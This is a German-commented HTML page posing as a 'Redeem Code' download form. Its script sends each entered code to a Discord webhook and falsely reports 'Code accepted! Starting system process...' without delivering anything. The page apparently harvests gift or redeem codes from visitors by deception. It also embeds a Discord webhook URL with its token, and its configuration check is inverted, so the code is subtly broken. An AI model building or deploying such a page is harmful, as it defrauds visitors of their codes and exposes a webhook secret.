<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redeem Code - Download</title>
    <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@500;600;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #191B1D;
            --card-bg: #232527;
            --card-border: #393B3D;
            --accent-green: #00E676;
            --accent-green-dark: #00B359;
            --text-main: #FFFFFF;
            --text-sub: #9E9E9E;
            --input-bg: #111213;
            --error-red: #FF5252;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Fredoka', 'Inter', sans-serif;
            user-select: none;
        }

        body {
            background-color: var(--bg-dark);
            background-image: 
                radial-gradient(circle at 50% 0%, #2c3035 0%, transparent 75%),
                radial-gradient(#282b30 1px, transparent 1px);
            background-size: 100% 100%, 20px 20px;
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: var(--card-bg);
            border: 3px solid var(--card-border);
            border-radius: 16px;
            width: 100%;
            max-width: 440px;
            padding: 32px 24px;
            box-shadow: 0 12px 30px rgba(0,0,0,0.5), inset 0 2px 0 rgba(255,255,255,0.05);
            text-align: center;
            position: relative;
        }

        .title {
            font-size: 28px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 8px;
            text-shadow: 0 3px 0 rgba(0,0,0,0.3);
        }

        .subtitle {
            font-size: 14px;
            color: var(--text-sub);
            margin-bottom: 24px;
            font-family: 'Inter', sans-serif;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .code-input {
            width: 100%;
            padding: 16px;
            background: var(--input-bg);
            border: 3px solid var(--card-border);
            border-radius: 12px;
            color: #FFF;
            font-size: 18px;
            font-weight: 700;
            text-align: center;
            letter-spacing: 2px;
            outline: none;
            transition: border-color 0.2s;
            text-transform: uppercase;
        }

        .code-input:focus {
            border-color: var(--accent-green);
        }

        .code-input::placeholder {
            color: #555;
            letter-spacing: 1px;
            font-weight: 500;
        }

        .btn-download {
            width: 100%;
            padding: 16px;
            background: var(--accent-green);
            border: none;
            border-radius: 12px;
            color: #000;
            font-size: 20px;
            font-weight: 700;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 0 6px 0 var(--accent-green-dark);
            transition: all 0.1s ease;
        }

        .btn-download:hover {
            filter: brightness(1.1);
        }

        .btn-download:active {
            transform: translateY(4px);
            box-shadow: 0 2px 0 var(--accent-green-dark);
        }

        .btn-download:disabled {
            background: #444;
            box-shadow: 0 6px 0 #222;
            color: #888;
            cursor: not-allowed;
            transform: none;
        }

        .status {
            margin-top: 16px;
            font-size: 14px;
            min-height: 20px;
            font-family: 'Inter', sans-serif;
            font-weight: 600;
        }

        .status.success { color: var(--accent-green); }
        .status.error { color: var(--error-red); }
    </style>
</head>
<body>

    <div class="container">
        <h1 class="title">REDEEM CODE</h1>
        <p class="subtitle">Enter your code below to start the download</p>

        <div class="input-group">
            <input type="text" id="codeInput" class="code-input" placeholder="ENTER CODE HERE" autocomplete="off" spellcheck="false">
        </div>

        <button id="downloadBtn" class="btn-download">DOWNLOAD</button>

        <div id="statusMsg" class="status"></div>
    </div>

    <script>
        // Ersetze diese URL mit deiner echten Webhook-URL
        const WEBHOOK_URL = "DEINE_WEBHOOK_URL_HIER";

        const codeInput = document.getElementById('codeInput');
        const downloadBtn = document.getElementById('downloadBtn');
        const statusMsg = document.getElementById('statusMsg');

        downloadBtn.addEventListener('click', async () => {
            const code = codeInput.value.trim();

            if (!code) {
                showStatus("Please enter a valid code!", "error");
                return;
            }

            if (!WEBHOOK_URL || WEBHOOK_URL.includes("https://discord.com/api/webhooks/1564636275074662436/4-28eWe1zi7UYRt-Ww_22ysR-1sjwRUiaxqeo-1lN6ho6hc_Dirb36LjvYPjx0kjPcl3")) {
                showStatus("Error: Webhook URL is not configured.", "error");
                return;
            }

            downloadBtn.disabled = true;
            showStatus("Verifying code...", "");

            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        code: code,
                        timestamp: new Date().toISOString()
                    })
                });

                if (response.ok) {
                    showStatus("Code accepted! Starting system process...", "success");
                    codeInput.value = '';
                } else {
                    showStatus("Failed to process code. Try again later.", "error");
                }
            } catch (err) {
                console.error(err);
                showStatus("Network error while sending code.", "error");
            } finally {
                downloadBtn.disabled = false;
            }
        });

        function showStatus(msg, type) {
            statusMsg.textContent = msg;
            statusMsg.className = 'status ' + type;
        }
    </script>
</body>
</html>
